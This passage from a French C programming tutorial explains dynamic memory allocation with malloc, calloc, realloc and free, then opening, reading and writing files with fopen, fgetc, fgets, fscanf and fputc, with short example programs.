entier strictement positif et que le type de cet argument est un int ou un unsigned int . Et bien pas du tout ! malloc a besoin que la taille qu'on lui envoie soit de type size_t . Pourquoi ? Parce que size_t est le type utilisé par l'opérateur sizeof et est par conséquent le type naturel pour représenter la taille des objets sizeof Nous venons de le dire, malloc attend une certaine taille en argument. Autant prévenir tout de suite : cette taille est exprimée en bytes . Ainsi, si j'envoie 2000 en argument à malloc , celle-ci réservera 2000 bytes de mémoire. Seulement voilà, comment faire si je veux stocker 2000 int , ou 2000 double ? En effet, si je ne connais pas la taille du type de données à allouer avec malloc , il me sera impossible de connaitre la taille en octets de la mémoire à réserver avec malloc . Et cette la taille varie suivant l'ordinateur, le compilateur, le système d'exploitation, et l'âge du capitaine. Heureusement, on a déjà vu qu'il existe un opérateur qui permet de récupérer la taille d'un type : c'est sizeof . Grâce à cet opérateur, il est possible de connaître le nombre de bytes occupé par n'importe quel type (sauf void ). On peut ainsi allouer des zones mémoires de la bonne taille, grâce à cet opérateur. Ainsi, si on veut allouer $n$ éléments, il suffit de passer n * sizeof(Type d'un element) en argument de malloc . Retour de malloc Cette fonction va retourner un pointeur qui stocke l'adresse du début du bloc réservé. Ce pointeur est un pointeur sur void . Il faut dire que lorsque l'on réserve un bloc de mémoire, celui-ci peut être utilisé pour un tas de choses : des int , des char , des float , ou un mélange de données hétérogènes. Bref, malloc pouvant être utilisé pour tout et n'importe quoi, elle doit fatalement retourner un pointeur qui peut pointer sur tout et n'importe quoi. En clair, un pointeur sur void . Avec ce qu'on a dit au-dessus, on peut donc déduire facilement le prototype de notre fonction malloc. Le voici : void * malloc ( size_t size ); Exemple Maintenant, exerçons-nous en suivant le schéma introduit ci-dessus. On doit créer un pointeur et appeler malloc . int * ptr = malloc ( sizeof ( int )); Je déclare ici un pointeur sur un int , qui va servir à stocker l'adresse de la zone mémoire réservée par malloc . La règle est simple : pour allouer dynamiquement un objet de type T , il faut créer un pointeur de type T . Pour connaître la taille de l'objet que je veux allouer (ici un int ), j'utilise sizeof . Grâce à cet opérateur, on peut allouer des objets de taille différente très facilement. Maintenant, il faut pense à bien vérifier que l'adresse est valide. En effet, même s'il y a peu de chance que l'allocation échoue, le risque est toujours là, et pour s'en protéger il n'y a qu'une solution : vérifier que le pointeur est bien valide. Il suffit de tester si le pointeur est différent de NULL et d'agir en conséquence. Essayons avec notre code : int main ( void ) { int * ptr = malloc ( sizeof ( int )); /* si malloc a retourné NULL... */ if ( ptr == NULL ) { /* ...on affiche l'erreur grâce à perror */ perror ( \"Malloc\" ); } /* sinon c'est que l'allocation a réussi et on peut continuer */ puts ( \"Malloc a reussi !\" ); return 0 ; } Ce code présente une nouveauté : si jamais l'allocation a échoué et que le pointeur vaille NULL, on appelle la fonction perror . Cette fonction décrit la dernière erreur rencontrée durant un appel système ou une fonction de bibliothèque. Ainsi, si malloc échoue, perror affichera la raison de l'échec. Si au contraire l'allocation s'est bien passée, le programme affichera : « Malloc a reussi ! » . Mais que doit-on faire si malloc échoue hormis afficher l'erreur ? En général, on préfère quitter le programme. Pour cela, on utilise la fonction exit , également définie dans <stdlib.h> , que voici : void exit ( int status ); L'unique argument de cette fonction est status . Il peut être une des deux valeurs suivantes (définies aussi dans <stdlib.h> ) : EXIT_SUCCESS : À utiliser pour quitter le programme avec succès. EXIT_FAILURE : À utiliser pour quitter le programme en cas d'échec. Sachez néanmoins que dans le cas général, malloc a très peu de chance d'échouer. Ceci dit, on est jamais trop prudent, donc continuez de vérifier le retour de malloc et agissez en conséquence. Maintenant, on peut utiliser l'espace que l'on a alloué comme l'on veut. Mais une fois qu'on en a plus besoin, comment le libérer ? free - Libérer un espace alloué dynamiquement Comme je l'ai déjà dit, si on réserve de la mémoire avec l'allocation dynamique, c'est de façon plus ou moins temporaire. Au bout d'un certain temps, la mémoire qu'on a réservée ne nous sert plus. On doit alors la libérer pour la rendre réutilisable. Pour libérer la mémoire allouée, on a besoin d'une fonction dédiée à ça : free . Cette fonction libère la mémoire déjà réservée par un malloc , un calloc ou un realloc . Surtout, retenez bien une chose très importante : à chaque appel à malloc doit correspondre un appel à free . Autrement dit : un malloc == un free . Voici son prototype : void free ( void * ptr ); On remarque que la fonction free ne retourne rien, et c'est tout à fait normal (que voulez-vous retourner ?). Argument L'unique paramètre qu'elle prend est l'adresse de la zone mémoire à libérer. Ce paramètre est donc un pointeur. Et bien sur, vu qu'on ne sait pas ce pour quoi le bloc de mémoire utilisé a été utilisé, ce pointeur est un pointeur sur void , qui ne précise pas le type des données stockées dans le bloc de mémoire à libérer. Petite précision : si on passe un pointeur qui vaut NULL en argument de free , celle-ci ne fait rien. En revanche, quand on vous passez à free un pointeur sur un bloc de mémoire qui a déjà libéré, le comportement est indéterminé. Généralement, libérer plusieurs fois de la mémoire correspond à une erreur de programmation, mais il faut savoir que cela arrive parfois, et que savoir gérer ce genre de cas correctement est impératif. Pour éviter ce genre de problème, il y a une solution simple : une fois que vous avez effectué un free sur un pointeur, mettez-celui-ci à NULL. Comme ça, si jamais vous avez mal programmé et que vous libérez plusieurs fois un même pointeur, vous n'aurez pas de problèmes, vu que le pointeur à libérer sera un pointeur NULL : free ne fera rien. calloc - Allocation et mise à zéro La fonction malloc n'est pas la seule fonction qui permet d'allouer de la mémoire. Elle a des petites sœurs : calloc et realloc . Voyons un peu la fonction calloc . Cette fonction va simplement réserver un gros bloc de mémoire pour que l'utilisateur puisse l'utiliser comme il le souhaite. Son rôle est donc similaire à celui de malloc , à un détail près : malloc ne faisait rien sur le bloc de mémoire réservé et ne initialisait pas ; calloc fait exactement le contraire : elle va initialiser le bloc de mémoire réservé avec des zéros. Cependant, il est déconseillé de l'utiliser pour initialiser des données contentant des flottants ou des pointeurs, car selon les architectures, il se peut que mettre la zone mémoire à 0 ne mette pas des flottants ou des pointeurs à 0. Ceci est assez compliqué à expliquer sans rentrer dans les détails, mais nous devions néanmoins vous avertir. Voici le prototype de calloc : void * calloc ( size_t n , size_t size ); Arguments La fonction calloc attend deux paramètres. Le premier paramètre, noté n , n'est rien d'autre que le nombre d'éléments à allouer. Le second paramètre, noté size dans le prototype du dessus, indique la taille d'un élément. Ces deux paramètres sont de type size_t . Retour Comme pour malloc , calloc va renvoyer un pointeur qui contient l'adresse du début du bloc réservé. Il va de soit que ce pointeur est un pointeur sur void , exactement pour les mêmes raisons que malloc . realloc - Réallouer à volonté Passons maintenant à la cadette de la fratrie des fonctions d'allocation. Il s'agit de la plantureuse realloc . Celle-ci sert à agrandir ou rétrécir un bloc de mémoire qui a été préalablement réservé par malloc ou calloc . Voici son prototype : void * realloc ( void * ptr , size_t size ); Arguments Cette fonction prend donc deux arguments. Le premier est un pointeur qui pointe vers la zone de mémoire dont on veut changer la taille. Il est important de noter que le pointeur passé en argument doit obligatoirement avoir été alloué avec malloc , calloc ou realloc , sinon le comportement est indéterminé. Autre détail : si realloc reçoit un pointeur nul en argument, elle se comporte comme malloc . Le deuxième paramètre n'est rien d'autre que la nouvelle taille qu'on veut attribuer à ce bloc de mémoire. Petit détail : si realloc reçoit une taille nulle en argument, elle se comporte comme free . Retour Cette fonction retourne un pointeur qui pointe sur le bloc de mémoire. Il faut dire que le pointeur renvoyé par realloc n'est pas forcément le même que celui passé en paramètre : rien n'empêche realloc d'allouer un nouveau bloc de mémoire, déplacer les données de l'ancien vers le nouveau et libérer l'ancien. Il faut donc que realloc renvoie un pointeur vers ce nouveau bloc. Ce pointeur est un pointeur sur void , pour les mêmes raisons que malloc et calloc . Bien entendu, comme avec les deux autres fonctions, il faut vérifier que la fonction a réussie. Mais il y a également autre chose à prendre en compte, que nous allons illustrer avec un exemple. int * ptr = malloc ( 10 * sizeof ( int )); ptr = realloc ( ptr , 30 * sizeof ( int )); Dans notre code d'exemple, on ré-alloue directement la zone mémoire, ce qui a première vue est logique et normal. Mais si jamais la ré-allocation venait à échouer on se retrouverait avec un pointeur invalide (car realloc retournera NULL), mais aussi avec une zone mémoire qu'on ne pourra pas libérer, car on a perdu son adresse : c'est une fuite mémoire . Le seul moyen d'éviter cet accident est de passer par un pointeur intermédiaire : int * ptr = malloc ( 10 * sizeof ( int )); int * temp ; /* On veut agrandir la zone mémoire en passant de 10 int à 30 int. */ temp = realloc ( ptr , 30 * sizeof ( int )); if ( temp != NULL ) { /* Si l'allocation a marché, alors on peut faire pointer ptr sur la nouvelle zone mémoire ... */ ptr = temp ; } else { /* ... sinon on libère ptr, on le met à NULL, et on écrit l'erreur. */ free ( ptr ); ptr = NULL ; perror ( \"Realloc\" ); } /* On oublie pas de libérer à la fin. */ free ( ptr ); ptr = NULL ; Précisions On a dit plus haut qu'on pouvait agrandir ou rétrécir un espace avec realloc . Il faut savoir que dans les deux cas, les valeurs présentes dans le bloc de mémoire avant la ré-allocation seront conservées. Dans le cas d'un agrandissement, elles le sont intégralement. Et dans le cas d'un rétrécissement, on ne conserve que les valeurs des cases restantes. Ces fonctions d'allocation dynamique sont quand même bien pratique pour réserver de la mémoire quand on veut et dans la quantité qu'on veut, ce qui est bien pratique dans les cas où on ne sait pas d'avance combien réserver, comme par exemple quand c'est l'utilisateur qui rentre les données. Elles ne sont pas compliquées à utiliser, il faut simplement faire attention au retour de la fonction et ne pas oublier de tout libérer à la fin. Voilà, c'est la fin de la partie 2, qui a été bien dense et pleine de nouveaux concepts bien puissants. Si jamais certaines parties vous posent des soucis, relisez-les autant qu'il faut, puisque les informations contenues dans cette partie sont vitales pour bien programmer en C et comprendre la suite de ce tutoriel. D'ailleurs, nous allons voir dans les parties suivantes que ces concepts combinés ensembles peuvent être très pratiques. Les entrées-sorties Pour l'instant, nous ne connaissons rien aux entrées-sorties hormis les quelques fonctions vues dans les parties précédentes. Et pourtant la bibliothèque standard contient foule de fonctions capables de pleins de choses, dont ouvrir des fichiers, écrire dedans, signaler des erreurs, etc. Cette partie sera donc l'occasion non seulement des les découvrir, mais également d'apprendre à sécuriser les flux d'entrées et de sorties pour éviter les bêtises. L'un des principes du C est en effet de ne jamais croire l'utilisateur, celui-ci pouvant potentiellement faire n'importe quoi. Les flux Avez-vous remarqué que tout ce que nous avons fait jusqu'à maintenant n'était que temporaire et disparaissait dès qu'on quittait le programme ou qu'on éteignait l'ordinateur ? Il était impossible de stocker des informations de manières permanentes. Il est grand temps de réparer cette injustice et c'est le but de ce chapitre : vous apprendre à manipuler les fichiers en C. Il sera désormais possible de stocker des scores à un jeu vidéo ou les numéros de téléphone d'un carnet d'adresse par exemple. Un peu de théorie Préambule En informatique, un fichier est une collection, un ensemble d'informations numériques stockées sur un support de mémoire, comme un disque dur par exemple. Cette collection d'informations est réunie sous un même nom, et manipulées comme une unité. Afin de faciliter la localisation des fichiers, ces derniers sont classés dans des systèmes de fichier . Un système de fichiers est une façon de stocker les informations et de les organiser dans des fichiers. Une telle gestion des fichiers permet de traiter, de conserver des quantités importantes de données ainsi que de les partager entre plusieurs programmes informatiques. Un système de fichiers permet à l'utilisateur de localiser des données à partir d'un chemin d'accès . Le nom du fichier sert à décrire le contenu. Ce nom est souvent construit de la manière suivante : suffixe . extension . Une extension renseigne sur la nature des informations et le logiciel utilisé pour les manipuler. L'extension d'un fichier est facultative. Par exemple, sous les systèmes de type UNIX ou GNU/Linux, il n'est pas rare de trouver des noms de fichiers sans extension. Chaque fichier comporte un certain nombre de métadonnées, c'est à dire des informations concernant des informations sur le fichier en question telles que : sa longueur ; son auteur ; ses droits d'accès (les personnes autorisées à le manipuler) ; sa date de la dernière modification ; Le plus important dans un fichier est les informations qu'il contient. Le format d'un fichier est la convention selon laquelle les informations ainsi que les métadonnées sont écrites dans le fichier. Selon la nature et le format du contenu, les fichiers peuvent être qualifiés d'exécutables, de textes, de documents, d'images, d'audio, de vidéos etc. Voici quelques formats courants : Textes et documents : .txt ; .asc ; .doc ; .htm ; .html ; .msg ; .xls ; .odt Images : .gif ; .jpg ; .bmp ; .png ; .eps ; .tif Audio : .mp3 ; .wav ; .au ; .ra ; .ram Vidéo : .avi ; .mpg ; .mov Exécutables : .exe ; .com ; .bat Compressés : .arc ; .zip ; .z ; .arj ; .tar ; .sit ; .gz ; .bz2 ; .rar ; .xz Seulement, certains formats de fichiers peuvent être propriétaire et donc difficilement exploitables. Un format propriétaire est un format de fichier dont les spécifications sont contrôlées par une entité privée. Un tel format n'est pas libre d'utilisation. Dernier point : le chemin d'accès d'un fichier. Nous en avons déjà parlé brièvement plus haut, attardons-nous maintenant sur les petites particularité de ce dernier. Le chemin d'accès d'un fichier (ou d'un répertoire) est une chaîne de caractères décrivant la position de celui-ci dans le système de fichiers. Nous n'avons pas encore parler de la racine des répertoires. Sans entrer dans les détails, le répertoire racine est la base des répertoires de tout fichiers. Ensuite, c'est le séparateur de répertoire qui entre en jeu; c'est lui qui permet de localiser un fichier situé dans plusieurs sous-dossiers. Petit résumé : OS Répertoire racine Séparateur de répertoire UNIX-like / / Windows lecteur:\\ \\ Il est possible d'utiliser sous Windows le même séparateur de répertoire que les systèmes dérivés d'UNIX, à savoir : '/'. Cette pratique a pour effet de facilement rendre portable vos programmes. En effet, si l'on prévoit les grands deux séparateur de répertoire, la création d'une fonction à part et/ou l'utilisation du préprocesseur devient indispensable. Or là, tout est plus simple. Il existe deux moyens pour indiquer le chemin d'un fichier : Le chemin absolu, vous le connaissez bien, indique que le fichier va être cherchée en partant de la racine du système de fichiers. Par exemple : C:/Users/paraze/prog/fichiers/test.txt /home/paraze/prog/tuto/main.c /home/paraze/prog/tuto/fichier.txt /home/paraze/prog/tuto/ressources/scores.scr Le chemin relatif qu'en à lui, est identique au précédant à l'exception près qu'au lieu de partir de la racine, on commence au répertoire courant. En pratique, le répertoire courant est généralement celui où ce trouve l'exécutable. fichier.txt maximal_crazy.mp3 ressources/scores.scr Chacun possède ses défauts et qualités. Le chemin absolu est le plus sûr et le moins flexible. Le chemin relatif est bref, flexible, mais n'est pas sans danger. En langage C La bibliothèque standard du C fournie plusieurs fonctions qui permettent de réaliser des entrées/sorties de manière portable. Ici, c'est <stdio.h> qui travaille puisque, je vous le rappelle, ce fichiers d'en-tête signifie standard input-output , soit entrée-sortie standard . Les entrées/sorties en langage C se font par des flux ( stream en anglais), qui représentent des objets externes au programme, appelés fichiers. Selon la manière dont on veut réaliser les opérations d'entrées/sorties sur le fichier, on distingue deux grandes catégories de flux : les flux de textes et les flux binaires . En C, un flux est représenté par un pointeur sur une une structure de type FILE . Cette structure contient des informations concernant un fichier. Voici les trois flux pré-définis par <stdio.h> : stderr : Flux d'erreurs standard, par défaut, l'écran. stdout : Flux de sortie standard, par défaut, l'écran. stdin : Flux d'entrée standard, par défaut, le clavier. Ouverture et fermeture de flux fopen - Ouverture d'un flux L'ouverture d'un flux est nécessaire à la manipulation de ce dernier, et pour ce faire, la fonction fopen est tout indiquée. Explication Voici son prototype : FILE * fopen ( const char * path , const char * mode ); La chaîne de caractères constante path signifie chemin en français. Il faut donc passer en premier paramètre une chaîne de caractère contenant le chemin (absolu ou relatif, comme vous voulez). Petit rappel : certaines fonction du C comme printf considère le caractère '\\' comme un caractère spécial (ce caractère est en fait utilisé pour la manipulation de caractères d'échappements, comme '\\n' ou '\\t' ). Donc, pour ouvrir un fichier situé dans un sous-dossier, vous devrez doubler de l'antislash ( \"\\\\\" ) afin de bien faire comprendre au compilateur qu'on souhaite utiliser ce symbole. La seconde variable, nommée mode , indique le mode d'ouverture du fichier : veut-on simplement lire un fichier ou bien l'éditer ? Veut-on supprimer tout son contenu avant ? Voici différents modes d'ouvertures disponibles : \"r\" : lecture à partir du début du fichier. Le fichier indiqué par le premier argument doit obligatoirement exister, sinon la fonction échoue. \"w\" : écriture à partir du début du fichier. Si le fichier n'existe pas, il sera créé. Si il existe, son contenu est effacé. \"a\" : écriture à partir de la fin du fichier. Si le fichier n'existe pas, il sera créé. \"r+\" : lecture et écriture à partir du début du fichier. Le fichier indiqué par le premier argument doit obligatoirement exister, sinon la fonction échoue. \"w+\" : lecture et écriture à partir du début du fichier. Si le fichier n'existe pas, il sera créé. Si il existe, son contenu est effacé. \"a+\" : lecture et écriture à partir de la fin du fichier. Si le fichier n'existe pas, il sera créé. Ces six modes sont très important, et à savoir par cœur ; ils permettent d'ouvrir de simples flux de textes. Sachez qu'il en existe encore six autres. En effet, nous avons déjà brièvement parlé des flux binaires, ceux-ci sont manipulables grâce à des modes dit non formaté . Nous aurons l'occasion d'en reparler plus loin dans le chapitre. La fonction retourne un pointeur sur le flux demandé si l'ouverture a réussi ou bien NULL si elle a échoué. Comme pour les fonctions d'allocation dynamique, il faudra penser à vérifier le retour de fopen et agir en conséquence. Application Je vous mets au défi d'ouvrir un fichier quelconque localisé dans le répertoire courant en lecture simple ! Ces codes, d'apparences corrects, sont pourtant de véritables bombes à retardements. En effet, il suffit que l'ouverture échoue (ce qui arrive souvent, si le fichier n'est pas présent ou si vous avez fait une faute de frappe) pour que votre programme crash. Nous parlions tout à l'heure de la très utile valeur de retour de la fonction fopen . Comme un code vaut 42 mots, voici un exemple possible montrant la vérification du retour de cette fonction : #include <stdio.h> int main ( void ) { FILE * fichier = fopen ( \"fichier.txt\" , \"r\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } /* Opérations sur le fichier ... */ return 0 ; } Faut-il là aussi quitter le programme si fopen échoue ? C'est à vous de décider, mais en général l'échec de fopen est dû au fait que soit le fichier n'existe pas, soit le chemin est incorrect, donc mieux vaut retenter en proposant à l'utilisateur de modifier le chemin ou de créer le fichier. Fermer le programme est une façon un peu trop brutale de dire à l'utilisateur qu'il a fait n'importe quoi. fclose - Fermer un fichier Vous savez ouvrir un flux de texte et même vérifier son ouverture, mais le plus important, et le plus simple en passant, reste à voir. Vous vous souvenez du chapitre sur l'allocation dynamique, avec malloc , free et tout ce qui va avec ? Si vous êtes observateur, vous avez sûrement remarqué que l'on répète le même schéma : Déclarer un pointeur sur FILE : déclarer un pointeur ; Appeler la fonction *fopen * : appeler la fonction d'allocation Vérifier le retour de la fonction : idem. Que manque t-il ? La libération de la zone de mémoire. Cette fonction la voici : int fclose ( FILE * stream ); La fonction fclose libère le flux nommé stream . Il est impossible d'y accéder par la suite, sous peine d'un comportement indéterminé. Elle renvoie 0 en cas de réussite, et EOF si la fonction ne réussit pas à fermer correctement le fichier. La constante EOF signifie E nd O f F ile et est la plupart du temps retournée lorsque lit un fichier et que l'on arrive à la fin de celui-ci. Cependant, il arrive aussi qu'elle représente une erreur de traitement (comme dans le cas ici présent). Il est rare de voir cette fonction planter sans raison apparente, évitez juste de lui passer en paramètre un pointeur sur FILE déjà libéré ou non-alloué. Je vous donne le code final commenté : #include <stdio.h> int main ( void ) { FILE * fichier = fopen ( \"fichier.txt\" , \"r\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } /* Opérations sur le fichier ... */ fclose ( fichier ); fichier = NULL ; return 0 ; } Ouvrir plusieurs fichiers à la fois Certains se sont peut-être déjà demandés s'il est possible d'ouvrir plusieurs flux en même temps. La réponse est oui. Le code suivant vous montre un exemple où l'on ouvre 5 fichiers à la fois à l'aide d'un tableau de FILE* . Inutile de préciser que les règles sont les mêmes que précédemment. #include <stdio.h> #define TAILLE_MAX 20 #define NB_FICHIER 5 int main ( void ) { FILE * fichier [ NB_FICHIER ]; char s [ TAILLE_MAX ]; size_t i ; for ( i = 0 ; i < NB_FICHIER ; ++ i ) { sprintf ( s , \"fichier%d.txt\" , i + 1 ); fichier [ i ] = fopen ( s , \"r\" ); if ( fichier [ i ] == NULL ) { printf ( \"Erreur lors de l'ouverture du fichier %d \\n \" , i + 1 ); perror ( \"fopen\" ); /* ... */ } } /* ... */ for ( i = 0 ; i < NB_FICHIER ; ++ i ) { fclose ( fichier [ i ]); } return 0 ; } Y'a t-il une limite au nombre de flux ouvrables en même temps ? Il y a effectivement une limite, mais celle-ci peut être variable. Pour nous aider, nous avons deux constantes de préprocesseur définies dans <stdio.h> que voici : FOPEN_MAX : elle indique le nombre maximum ouvrables en même temps par un programme. La norme garantit qu'elle vaut au minimum 8 (en comptant les trois flux standards) : The value of the macro FOPEN_MAX shall be at least eight, including the three standard text streams -- C89 - 4.9.3 Files FILENAME_MAX : elle indique la taille maximum du nom d'un fichier pour qu'on soit sûr qu'il soit ouvert. Sous certaines implémentations, une taille supérieure marchera, mais dans le doute, essayez de limiter la taille du nom de vos fichiers. Ces deux constantes vous serons utiles pour faire un code portable et sans risque de comportement indéterminé quand vous serez amenés à manipuler de nombreux fichiers. Lecture d'un flux fgetc - Lecture d'un caractère Commençons doucement avec la fonction fgetc qui lit un caractère depuis un flux. Voici son prototype : int fgetc ( FILE * stream ); Avant de continuer, il faut savoir que lire un fichier réclame quelque chose d'important : un indicateur de position . Il faut savoir que lorsque l'on parcourt un flux, un indicateur de position est utilisé pour indiquer où on en est dans le flux. Imaginez-vous un curseur virtuel que l'on avance d'une case à chaque caractère lu par fgetc , et vous aurez compris le principe. fgetc renvoie donc le caractère lu si tout s'est bien passé ou la macro EOF si l'indicateur de position est tout à la fin du fichier (ou en cas d'erreur). Afin d'effectuer des opération sur un fichier, il faut toujours réfléchir sur le meilleur mode d'ouverture à choisir. Nous souhaitons lire un fichier, ce qui nous laisse que 4 possibilités : \"w+\" : supprime le contenu du fichier précédemment ouvert ; \"a+\" : place l'indicateur de position est à la fin de celui-ci ; \"r+\" : ouvre le fichier en lecture et en écriture, l'indicateur de position est placé au début ; \"r\" : ouvre le fichier en lecture, l'indicateur de position est placé au début ; Deux modes d'ouvertures sembles correspondre : le simple \"r\" et \"r+\" . Les deux sont corrects pour notre utilisation, je recommande cependant l'utilisation du premier, qui nous assure que le fichier ne sera pas modifié ; c'est une mesure de protection. Voici donc un code lisant la première lettre d'un fichier nommé salutation.txt contenant la phrase Salut : #include <stdio.h> int main ( void ) { FILE * fichier ; int c ; fichier = fopen ( \"salutation.txt\" , \"r\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } c = fgetc ( fichier ); putchar ( c ); fclose ( fichier ); fichier = NULL ; return 0 ; } Voilà ce que cela donne : S Cette fonction peut lire un caractère de n'importe quel flux, nous pouvons donc faire ceci pour récupérer un caractère depuis le flux d'entrée standard : c = fgetc ( stdin ); L'appel de la fonction getchar est strictement identique à l'utilisation de fgetc sur stdin . Néanmoins, la grande limite de fgetc est le fait qu'elle ne lis qu'un seul caractère. Afin de lire tout le contenu d'un fichier, l'utilisation d'une boucle est tout indiqué. Rappelez-vous, EOF est retourné en cas de fin de fichier. int main(void) { FILE * fichier; int c; fichier = fopen(\"fichier.txt\", \"r\"); if(fichier == NULL) { perror(\"fopen\"); /* ... */ } /* Tant que le caractère actuel n'est pas la fin du fichier */ while((c = fgetc(fichier)) != EOF) { putchar(c); } fclose(fichier); fichier = NULL; return 0; } Salut ! Je m'appelle paraze. fgets - Lecture d'une chaîne de caractères Voici le prototype de la fonction fgets : char * fgets ( char * s , int size , FILE * stream ); Cette fonction est un peu plus compliquée que la précédente. Elle lit une ligne de caractère depuis le flux stream . Plus précisément, elle lit le flux caractère par caractère (en comptant le '\\0' ) puis s'arrête lorsqu'elle a déplacé l'indicateur de plus de size - 1 (le nombre voulu de caractères). La fonction fgets possède encore deux autres conditions d'arrêt : lorsqu'elle rencontre un retour à la ligne ou lorsqu'elle lit EOF. Le pointeur s contient la chaîne lue par fgets . La fonction retourne ... le pointeur s . À l'instar de la fonction fgetc , le retour de cette fonction permet de savoir s'il y a eu un problème de lecture ou si l'on est à la fin du fichier. Ces deux cas conduiraient simplement au retour de la valeur NULL. Voici un code possible utilisant fgets : #include <stdio.h> #define TAILLE_MAX 100 int main ( void ) { FILE * fichier ; char chaine [ TAILLE_MAX ]; fichier = fopen ( \"fichier.txt\" , \"r\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } fgets ( chaine , TAILLE_MAX , fichier ); puts ( chaine ); fclose ( fichier ); fichier = NULL ; return 0 ; } Salut ! Remarquez l'utilisation de la constante TAILLE_MAX. L'utilisation d'une telle macro est très courante lorsque l'on manipule des flux, car elle permet de créer une chaîne de caractère aussi grande que le nombre de caractère maximum que l'on va lire sur une ligne. Comme la première ligne de mon fichier fait moins que 100 caractères, elle est entièrement lue. Essayez de faire varier cette constante (c'est là que l'on voit bien son utilité : on évite de modifier à deux reprises cette valeur) et vous verrez, la chaîne lue est tronquée ; de plus, aucun débordement de mémoire n'est fait. C'est une sorte de sécurité. Vous avez toutes les clés en main, lire entièrement le fichier ne devrait pas être trop difficile : #include <stdio.h> #define TAILLE_MAX 100 int main ( void ) { FILE * fichier ; char chaine [ TAILLE_MAX ]; fichier = fopen ( \"fichier.txt\" , \"r\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } /* Tant que la fin du fichier n'est pas rencontrée */ while (( fgets ( chaine , TAILLE_MAX , fichier )) != NULL ) { puts ( chaine ); } fclose ( fichier ); fichier = NULL ; return 0 ; } Puisque fgets déplace l'indicateur de conversion d'une ligne lors d'un appel, la future lecture (voyez par là le futur appel) débutera à partir du début de la ligne suivante. Dernier point concernant cette fonction : le caractère '\\n' est inclut dans la chaîne précédemment lue. C'est pour cela que notre code ci-dessus affichait correctement le fichier, avec des retours à la ligne. Cela peut vite devenir un problème, si l'on essaie de comparer la chaîne lue avec une autre chaîne de caractères quelconque par exemple. Le '\\n' sera pris en compte lors de la comparaison et risque d'altérer le comportement de notre fonction d'analyse. Comment palier à ce problème ? Il faut chercher le caractère '\\n' et le remplacer par '\\0' . Pourquoi ne pas créer une fonction tant qu'à faire ? Cela fera un très bon exercice. La grande famille de scanf Concluons cette sous partie sur l'une des sœurs de scanf : fscanf . Cette dernière aura le même fonctionnement que scanf , à l'exception près que l'on doit lui indiquer le flux à lire. La fonction de base lis le flux stdin ; dans notre cas, avec fscanf , ce sera le fichier à analyser. Voici son prototype : int fscanf ( FILE * stream , const char * format , ...); Voici un exemple concret d'utilisation, en supposant que j'ai sous la main un fichier nommé scores.txt contenant : paraze 100 Pouet_forever 96 SofEvans 95 informaticienzero 42 tib92 37 Afin de récupérer le noms des joueurs ainsi que leurs points, voici comment je procéderai : #include <stdio.h> int main ( void ) { FILE * fichier ; char nom [ 5 ][ 50 ]; int score [ 5 ]; int i ; fichier = fopen ( \"scores.txt\" , \"r\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } for ( i = 0 ; i < 5 ; i ++ ) { fscanf ( fichier , \"%s %d\" , nom [ i ], & score [ i ]); printf ( \"%s : %d \\n \" , nom [ i ], score [ i ]); } fclose ( fichier ); fichier = NULL ; return 0 ; } La fonction fscanf lit le symbole \"%s\" , puis cherche la première chaîne de caractère présente à partir de l'indicateur de position, soit \"paraze\" . Ce curseur justement, est déplacé de 6 caractères (la longueur de la chaîne). Ensuite, elle cherche un nombre (présence de l'indicateur de conversion \"%d\" ), la valeur 100 est sélectionnée. L'appel de cette fonction est terminée, et nous avons finalement récupéré et stocké une chaîne de caractère et un nombre entier. Elle procède ainsi pour chaque ligne. Coupler les structures avec fscanf est une idée très judicieuse. En effet, imaginez un fichier construit avec la structure suivante : <pseudo> <commentaire> <nb_partie> <score> Se balader avec 4 tableaux serait un peu lourd, alors pourquoi ne pas utiliser la puissance des structures ? #define TAILLE_MAX 100 typedef struct { char pseudo [ TAILLE_MAX ]; char com [ TAILLE_MAX ]; unsigned nb_parties ; unsigned score ; } Info ; Serez-vous capable de remplir les champs de cette structure à partir d'un fichier ? Écriture dans un flux Vous vous en doutiez sûrement, après la découverte de trois fonctions permettant de lire un flux, nous allons travailler sur des fonctions d'écriture. Vous pourrez facilement observer la similitude entre ces fonctions et celles vues à l'instant. fputc - Écriture d'un caractère La fonction fputc écrit un et seulement un seul caractère dans fichier : int fputc ( int c , FILE * stream ); Vous l'aurez bien compris, cette fonction écrit le caractère c de type int dans le flux stream . Elle renvoie la plupart du temps le caractère qui vient d'être écrit ; en cas d'erreur, EOF est retourné. Nous avions déjà débattu sur le mode d'ouverture à choisir, et je vous propose de recommencer. Afin d'écrire dans un fichier vierge, je vous recommande le mode \"w\" et \"w+\" , ces deux-là créent le fichier s'il n'existe pas, efface son contenu et bien sûr permettent l'écriture dans ce dernier. Les modes \"a\" et \"a+\" sont tout aussi intéressant : si le fichier est inexistant, il sera créé ; de plus, son contenu n'est pas effacé et l'indicateur de position est placé à la fin du fichier (et donc au début dans le cas d'un fichier vide). Le dernier mode d'ouverture acceptant l'écriture d'un flux est \"r+\" , le curseur virtuel est je vous le rappelle placé au début du fichier, rien est effacé mais le fichier doit obligatoirement être présent, sous peine d'échec de la fonction. Dans cet exemple, le mode choisi sera \"w\" puisque l'on a pas besoin de lire le fichier, ni d'ajouter du texte à un endroit précis. Le code suivant écrit le texte \"Salut\" dans un fichier nommé test.txt : #include <stdio.h> int main ( void ) { FILE * fichier ; fichier = fopen ( \"test.txt\" , \"w\" ); if ( fichier == NULL ) { perror ( \"fopen\" ); /* ... */ } /* Écriture de \"Salut\" */ fputc ( 'S' , fichier ); fputc ( 'a' , fichier ); fputc ( 'l' , fichier ); fputc ( 'u' , fichier ); fputc ( 't' , fichier ); fclose ( fichier ); fichier = NULL ; return 0 ; } Vous exécutez le programme, et rien ne se passe ... en apparence. Effectivement, si vous ouvrez le fichier test.txt avec un éditeur de texte, vous verrez que la chaîne \"Salut\" s'est bel et bien créée. Comme vous pouvez le constater, la fonction fputc n'est pas très pratique pour écrire de longue chaîne de caractères. On pourrait imaginer l'utilisation d'une boucle comme ceci pour pallier à ce problème : const char * s = \"Salut\" ; const size_t taille = strlen ( s ); size_t i ; /* Je passe l'ouverture du fichier et la vérification */ for ( i = 0 ; i < taille ; ++ i ) { fputc ( s [ i ], fichier ); } C'est déjà mieux, bien que peu pratique. L'idéal serait d'avoir une fonction qui puisse écrire 